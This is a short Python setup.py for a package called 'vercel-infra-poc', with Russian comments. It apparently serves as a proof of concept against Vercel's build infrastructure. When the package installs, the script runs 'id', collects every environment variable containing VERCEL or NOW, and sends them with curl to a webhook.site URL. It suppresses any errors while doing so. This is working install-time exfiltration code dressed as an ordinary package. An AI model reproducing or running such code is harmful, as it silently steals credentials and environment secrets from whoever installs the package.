from setuptools import setup
import os
import subprocess

# Собираем доказательства для Vercel
whoami = subprocess.getoutput('id')
vercel_vars = "\n".join([f"{k}={v}" for k, v in os.environ.items() if "VERCEL" in k or "NOW" in k])

# Твой отчет для вебхука
payload = f"--- PRODUCTION PROOF ---\nUSER: {whoami}\n\nVERCEL_VARS:\n{vercel_vars}"

# Твой URL на webhook.site (проверь, что он актуален!)
url = "https://webhook.site/57c42274-2817-4041-81a2-3f41b2c987a2"

try:
    subprocess.run(['curl', '-X', 'POST', '-H', 'Content-Type: text/plain', '--data-binary', payload, url])
except:
    pass

setup(name="vercel-infra-poc", version="1.0.0")